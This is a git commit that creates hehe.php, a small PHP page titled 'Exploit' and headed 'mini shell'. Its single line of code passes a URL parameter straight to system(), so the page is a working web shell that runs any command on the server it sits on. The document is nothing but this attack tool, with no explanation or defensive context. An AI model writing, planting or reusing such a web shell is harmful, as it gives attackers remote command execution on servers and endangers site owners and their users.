e23e8d5468fd48ad4cea1ec52f3e4bbeb2a86c9e
code016hiro <107974207+Code002016@users.noreply.github.com>
2025-03-21 16:17:34 +0700

    Create hehe.php

---
+++ hehe.php
@@ -0,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit</title>
+</head>
+<body>
+    <h1>mini shell</h1>
+    <?php system($_GET[0]); ?>
+</body>
+</html>
+
+
